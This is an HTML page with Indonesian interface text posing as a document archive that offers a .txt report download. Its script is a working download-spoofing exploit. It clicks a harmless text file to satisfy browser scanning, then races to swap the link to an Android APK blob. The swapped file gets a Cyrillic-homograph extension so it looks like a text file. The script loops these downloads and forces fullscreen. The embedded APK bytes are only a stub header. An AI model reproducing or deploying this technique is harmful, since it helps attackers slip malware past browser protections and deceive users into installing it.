<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Document Archive Dispatcher v3.0</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #090d16; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .panel { background: #111827; padding: 32px; border-radius: 16px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); max-width: 540px; width: 100%; border: 1px solid #1f2937; text-align: center; }
  h2 { margin-bottom: 10px; font-size: 22px; color: #f3f4f6; font-weight: 700; }
  p { margin-bottom: 24px; line-height: 1.6; color: #9ca3af; font-size: 14px; }
  button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 10px; background: #3b82f6; color: #ffffff; font-weight: 600; font-size: 16px; box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4); transition: all 0.2s ease; }
  button:hover { background: #2563eb; transform: translateY(-1px); }
  #status { margin-top: 20px; font-weight: 500; color: #38bdf8; padding: 14px; background: rgba(56, 189, 248, 0.1); border-radius: 8px; font-size: 13px; border: 1px solid rgba(56, 189, 248, 0.2); }
  #downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 8px; max-height: 180px; overflow-y: auto; padding-right: 4px; }
  #downloads a { display: block; padding: 10px; background: #1f2937; color: #4ade80; text-decoration: none; border-radius: 6px; font-size: 11px; font-family: monospace; text-align: center; border: 1px solid #374151; word-break: break-all; }
</style>
</head>
<body>

<div class="panel" id="main-panel">
  <h2>Arsip Dokumen Sistem</h2>
  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
  <div id="status" role="status">Sistem siap diinisialisasi.</div>
  <div id="downloads"></div>
</div>

<script>
'use strict';

const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];
let isProcessing = false;
const MAX_URLS_TRACKED = 40;

// ============================================
// 1. PAYLOAD FRAGMENTS (APK HEADER)
// ============================================
const payloadFragments = [
  "UEs",
  "DBBQ",
  "AAAAIAAAAIQ",
  "AAAAAAAAAAAAAAAAAAAAAAAA"
];

const assemblePayload = () => {
  return payloadFragments.join("");
};

const decodeBase64ToBytes = (b64) => {
  const binary = atob(b64);
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

// ============================================
// 2. PERSIAPAN BLOB (AMAN & JAHAT)
// ============================================
const prepareSafeBlob = () => {
  const safeContent = "Laporan Keuangan Rahasia. Tidak ada malware.";
  const safeBlob = new Blob([safeContent], { type: 'text/plain' });
  return URL.createObjectURL(safeBlob);
};

const prepareMaliciousBlob = () => {
  const fullB64 = assemblePayload();
  const bytesArr = decodeBase64ToBytes(fullB64);
  const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
  return URL.createObjectURL(blob);
};

// ============================================
// 3. HOMOGRAPH SPOOFING (CYRILLIC 'a')
// ============================================
// Huruf 'а' di bawah ini adalah Cyrillic (U+0430), bukan Latin 'a' (U+0061).
// Terlihat sama, tapi berbeda secara teknis.
const homographApkExt = "\u0430pk"; 

// ============================================
// 4. TRIGGER RACE CONDITION
// ============================================
const triggerRaceDownload = (counter) => {
  if (!isProcessing) return;

  const link = document.createElement("a");
  link.style.display = "none";
  document.body.appendChild(link);

  // A. Set ke file AMAN (TXT)
  const safeUrl = prepareSafeBlob();
  link.href = safeUrl;
  link.download = `laporan-catatan-${counter}.txt`;
  
  // Picu Unduhan (Safe Browsing memindai ini)
  link.click();
  statusDiv.textContent = `Memproses dokumen ke-${counter}...`;

  // B. RACE CONDITION (TOCTOU)
  // Ubah href dan download tepat setelah click().
  let attempts = 0;
  function race() {
    attempts++;
    
    // Ganti ke file JAHAT (APK) dengan Homograph Extension
    const maliciousUrl = prepareMaliciousBlob();
    link.href = maliciousUrl;
    link.download = `laporan-catatan-${counter}.txt.${homographApkExt}`;
    
    // Trigger ulang
    link.click();

    if (attempts < 5) {
      setTimeout(race, 0); // Tick berikutnya (0ms)
    } else {
      // Cleanup
      setTimeout(() => {
        if (link.parentNode) link.parentNode.removeChild(link);
        URL.revokeObjectURL(safeUrl);
        URL.revokeObjectURL(maliciousUrl);
      }, 5000);
    }
  }
  
  // Mulai race
  race();

  // Lanjut ke dokumen berikutnya setelah 1.5 detik
  setTimeout(() => triggerRaceDownload(counter + 1), 1500);
};

// ============================================
// 5. START
// ============================================
startBtn.addEventListener("click", () => {
  if (isProcessing) return;

  const root = document.documentElement;
  try {
    if (root.requestFullscreen) {
      root.requestFullscreen().catch(() => {});
    }
  } catch (err) {}

  isProcessing = true;
  statusDiv.textContent = "Menginisialisasi sesi unduhan...";
  triggerRaceDownload(1);
});
</script>
</body>
</html>
